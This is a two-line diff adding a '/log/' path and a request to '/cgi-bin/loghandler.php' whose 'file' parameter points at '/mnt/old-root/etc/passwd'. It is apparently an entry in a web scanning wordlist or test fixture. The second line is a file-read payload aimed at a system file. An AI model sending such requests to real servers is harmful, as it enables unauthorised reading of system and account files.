@@ -1,0 +1,2 @@
+/log/
+/cgi-bin/loghandler.php?ajax=251&file=/mnt/old-root/etc/passwd
